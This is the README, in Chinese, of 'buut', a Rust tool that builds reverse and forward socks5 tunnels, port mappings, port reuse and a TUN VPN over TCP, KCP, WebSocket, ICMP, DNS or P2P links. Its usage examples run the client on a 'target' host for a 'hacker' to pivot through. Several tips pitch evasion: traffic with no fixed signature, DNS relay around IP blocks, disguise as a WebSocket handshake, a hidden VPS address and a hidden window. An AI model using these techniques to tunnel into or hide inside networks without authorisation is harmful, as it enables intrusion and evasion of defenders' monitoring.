# BUUT

https://github.com/YDHCUI/buut

用 Rust 写的高性能正反向隧道代理工具。**一个单文件二进制**，同时提供反向 socks5、
正向隧道、端口映射、端口复用与三层 TUN(VPN)；链路可在 **TCP / KCP(UDP) / WebSocket / ICMP / DNS  / P2P**
之间切换，`-m` 一个参数即可决定，两端共用同一套加密与复用层。



## 核心优势

| 优势 | 说明 |
|---|---|
| 协议可插拔 | `-m tcp/udp/ws/icmp/quic/dns` 任意切换；隧道、端口映射、TUN 与链路完全解耦，换协议不换用法。 |
| 弱网与封锁场景 | ICMP 隧道只依赖 ping；DNS 隧道可借公共解析器中继，客户端不直连服务端；WS 穿仅放行 HTTP 的设备；Noise 握手 + 双向独立 ChaCha20Poly1305 密钥，无固定流量特征。 |
| 多通道聚合 | `--channel N` 建 N 条独立连接，按五元组哈希把每条流固定到一条通道：并行提速且不跨通道乱序。 |
| 单文件多形态 | 客户端与服务端同一二进制，参数组合出 6 种形态；一份源码交叉编译 7 个目标，Windows 侧用 VC-LTL / YY-Thunks 兼容 Win7 与 XP。 |
| 单向 VPN 拓扑 | 服务端最多加一条 `--tun_route` 即可访问对端内网，客户端不加任何路由 —— 对端无法反向进入服务端网络。 |
| 端口复用零依赖 | Linux 按 `sk_lookup` → `nf_tables` → `iptables` 三级回退，前两级不需要任何外部命令，精简镜像/容器可用。 |
| 干净退出 | SIGINT/SIGTERM 统一清理路由/防火墙/复用规则；即使被 `kill -9`，下次启动也会先清掉同规则的残留副本。 |
| 可选压缩 | `-Z` LZ4 分块压缩隧道内流量，两端独立开启，对上层透明。 |

## 工作原理

```text
  socks5 客户端 ┐
  端口映射/转发  ├──> [ 业务层 ]  反向隧道·正向隧道·端口映射·TUN
  TUN (IP 包)   ┘         │  多路复用 + ChaCha20Poly1305
                          │
                          │  前缀分帧 (vpn/frame.rs)
                          v
                 [ 传输层 ]  -m tcp | udp(kcp) | ws | icmp | quic | dns
                          │
                          │  N条通道 (--channel，按流哈希固定分流)
                          v
                     公网  <════════════════>  对端 (同一份二进制)
```

隧道内的每一帧都是「4 字节长度前缀 + ChaCha20Poly1305 密文」：业务层只管往里塞字节流，
走哪种链路、几条通道、是否压缩，全部由 `-m` / `--channel` / `-Z` 在启动时决定。

## 参数介绍

| 参数 | 说明 |
|---|---|
| `-k, --key` | 加密密钥 |
| `-l, --listen_addr` | 监听地址 (服务端) |
| `-s, --remote_addr` | 远程地址 (客户端)；dns 中继模式填隧道域名，如 `gw.example.com` |
| `-f, --forward_addr` | 转发地址，只支持正向 |
| `-p, --proxy_port` | 代理端口，默认 10086；或端口映射 `本地:目标`，如 `80:81` |
| `-m, --transport` | 协议类型，默认 TCP，支持 `<TCP\|KCP\|WS\|ICMP\|DNS\|P2P>`  |
| `-c, --config` | 配置文件 (toml) |
| `-n, --name` | 客户端 id |
| `--channel` | 通道数量，默认 1 |
| `--headers` | 连接服务所需的其它配置，如 cookie |
| `--srcip` | 来源 IP，端口复用时使用 |
| `--socks_pass` | 代理密码，默认 `buut:buut`，`NOAUTH` 关闭认证 |
| `--noise_params` | 加密方式，默认 `Noise_KK_25519_ChaChaPoly_BLAKE2s` |
| `--relay_server` | 中继服务器：`-m dns` 中继模式为上游解析器 (如 `8.8.8.8`，配合 `-s 域名`)；`-m p2p` 为中继 (默认 `n0`，可填自建 relay 域名) |
| `--tun_name` / `--tun_mtu` | TUN 网卡名 (默认 `buut0`) / MTU (默认 1380) |
| `--tun_ip` | TUN 本端 IPv4 地址，服务端默认 `10.0.7.1`，客户端 `10.0.7.2` |
| `--tun_route` | 服务端访问对端内网的网段，逗号分隔 CIDR，如 `192.168.1.0/24`；不写则不加路由 |
| `-F, --forward` | 正向模式 |
| `-S, --service` | 服务模式，同时监听 tcp+icmp+udp（udp 为 p2p 或 kcp，按编译 feature 二选一；icmp 仅非 Windows 服务端） |
| `-X, --soreuse` | 端口复用 |
| `-Z, --compres` | LZ4 流量压缩，两端需同时开启 |
| `-H, --hidecmd` | 隐藏窗口，仅 Windows |
| `-T, --tun` | TUN(VPN) 模式，需管理员权限与 `--features vpn` 构建，链路协议由 `-m` 决定，配合 `-l` 或 `-s` 使用 |

`./buut -h` 可查看完整的帮助信息。

## 使用方法

### 反向隧道

```bash
    vps执行：          ./buut -l 443
    target执行：       ./buut -s vps:443
    hacker连接socks5   vps:10086
```


### 正向隧道

```bash
    target执行：       ./buut -F -l 443
    vps执行：          ./buut -F -s target:443
    hacker连接socks5   vps:10086
```

服务需登录才能访问时用 `--headers` 带上 cookie 等请求头：
```bash
    vps执行：          ./buut -F -s https://target:1234/xx --headers Cookie:Session=xxxxxx;
```

建议同时用 `-f` 设置 forward_addr：buut 识别到非 buut 流量时转发到对应地址。

### 自建代理

直接起一个 socks5 服务，应用场景是在内网机器里做二级代理 (流量不加密)：
```bash
    vps执行：          ./buut -F -S -l 10086
    user连接socks5     vps:10086
```

透明端口转发，把 2222 端口的流量原样转发到 forward_addr，不做任何处理：
```bash
    ./buut -F -S -l 2222 -f 11.22.33.44:22
    # Port Forwarding On [0.0.0.0:2222 <-> 11.22.33.44:22]
```

### 端口映射

```bash
    vps执行：          ./buut -l 443
    target执行：       ./buut -s vps:443 -p 81:80
    # vps 上: Port Mapping On [0.0.0.0:81 <-> 192.168.1.21:80]
```

### 端口复用

1、web 服务已占用 8080 端口，直接监听报 `os error 10048`；加 `-X` (SO_REUSEADDR) 可与
**同样启用了 SO_REUSEADDR 的服务**共存：
```bash
    ./buut -X -F -l 8080
```

2、原服务未启用 SO_REUSEADDR 时，用 `--srcip` 做"按来源改送"的端口复用
(把某来源访问原端口的连接改送到 buut 的端口)：
```bash
    [root@localhost]# ./buut -X -F -l 32001 --srcip 192.168.2.122
    Rule src:192.168.2.122 port:32001 redirect:32002 applied Succ!
    Agent Forward ID [EJ1TROJd] Listen On [tcp://0.0.0.0:32002]
```

3、客户端正常连接 web 端口即可：buut 流量伪装成 WebSocket 握手，非 buut 流量走原服务
```bash
    ./buut -F -s 123.151.152.153:32001
```

Linux 下 `--srcip` 按 eBPF `sk_lookup`(内核 5.9+) → `nf_tables`(4.10+，netlink) → `iptables` 命令
三级回退，前两级**不依赖任何外部命令**，精简镜像/容器可用；iptables 规则放专用链 `BUUT_PRE`，
注销只清自己的链；所有后端在 Ctrl+C / SIGTERM 时自动清理。macOS 用 pf 的 `rdr` (anchor `buut`)。
目前只支持对 tcp 做端口复用。


### DNS 隧道 (-m dns)

**直连模式** (默认)：客户端直接把查询发到服务端地址。
```bash
    vps执行：    ./buut -m dns -l 0.0.0.0:53 -k 密码      # Linux 绑 53 需 root, 也可高位端口
    本机执行：   ./buut -m dns -s vps:53 -k 密码          # socks5 与其它反向模式一样监听在 vps:10086
```

**中继模式** (`--relay_server`)：客户端把查询发给公共递归解析器 (如 8.8.8.8)，解析器递归
解析到你的权威服务器 —— 流量路径 `客户端 <-> 解析器 <-> 服务端`，两端**没有任何直接连接**，
适合服务端 IP 被封但域名解析可用的场景；`-s` 填隧道域名 (NS 指向权威服务端)。
```bash
    # 前提 (一次性域名准备，在域名 DNS 服务商处配置):
    #   1. 加 NS 记录: gw.example.com NS ns1.example.com
    #   2. 加 A 记录:  ns1.example.com A <vps_ip>
    #   3. 域名不要启用 DNSSEC (无 DS 记录), 否则解析器校验失败返回 SERVFAIL

    vps执行：    ./buut -m dns -l 0.0.0.0:53 -k 密码      # 权威服务端, 必须 UDP 53
    本机执行：   ./buut -m dns -s gw.example.com --relay_server 8.8.8.8 -k 密码
    # 正向模式同理，两端都加 -F (本机可加 -p 1080)
```


### P2P 模式 (-m p2p)

基于公钥身份的 P2P 隧道 (QUIC 栈)：两端都在 NAT 内网时自动打洞升级直连，
打洞失败 (如对称 NAT) 退化为 relay 中继。


应用场景为 
1、没有vps服务器两边都是nat内网的情况， 
2、有vps 但是ip可能被封的情况。


**连接生命周期**：`-s` 地址可达时直接 UDP 直连；不可达时经 relay 中继，同时并行打洞，
成功后 QUIC 路径迁移为直连。


```bash
    vps执行：       ./buut -m p2p -l 4455 -k 密码          
    内网机器执行：  ./buut -m p2p -s vps:4455 -k 密码
    hacker连接socks5   vps:10086
```

两端都在 NAT 内网时同样可用 (互连双方均无法被直接访问)：任意一方当服务端 (`-l`)，
另一方 (`-s`) 经 relay 完成握手与打洞后直连；对称 NAT 下保持 relay 中转。

**注意** 由于p2p模式可以不用指定正确的远程地址 校验是依赖于key生成公钥来实现,所以记得给每个客户端使用不同的key。


## TUN 模式 (VPN)

`--tun` 开启三层 VPN 

```text
  公网 VPS(服务端)                 隧道                     对端(客户端/内网)
 +------------------+    +---------------------+    +--------------------+
 | --tun_route 一条  |    | 链路协议 (-m)        |    | TUN buut0          |
 | 10.0.7.1/24      |--->| tcp/udp/ws/icmp/    |--->| 单向转发 (SNAT)     |
 |                  |    | quic/dns + AEAD     |<---| 10.0.7.2/24        |
 +------------------+    +---------------------+    +--------------------+
        ^                                                    |
        | socks5 vps:10086 <── 流帧 ── 同一条隧道 ───────────┘
        |
   单向: 服务端 -> 对端内网 可通 ; 对端 -> 服务端网络 无路由, 不可达
```

### Tips

1、设置 BUUT 变量隐藏 vps：原本的 `./buut -s vps:1234` 可改成 `export BUUT=vps:1234 && ./buut -s 1`

2、buut 默认启用密码校验，默认用户名密码 buut:buut。

3、如果需要修改 socks_pass 则需为每个 agent 端单独设置，如 `./buut -s 127.0.0.1:443 --socks_pass 123456`

4、使用带 log 的版本进行调试：`./buut -l 1234 --log info`

5、`-Z` 流量压缩两端需同时开启，只压缩隧道内流量，对上层完全透明；VPN/ICMP 模式下每包独立压缩，两端可各自独立开启。


### 配置文件 (-c)

所有参数都可写进 toml 配置文件 (`-c conf.toml`)，字段名与命令行长参数一致；
优先级为 **命令行 > 配置文件 > 默认值**，没写的字段自动用默认值。写法与命令行对齐：
完整字段见仓库根目录的 `conf.toml` 模板。



## 交流 

加V

![a8e5625b211ad3b3c435e9403ebae9f](https://github.com/YDHCUI/buut/assets/46884495/6c667bb1-7eae-464f-afbd-3f0d67cbcbcb)
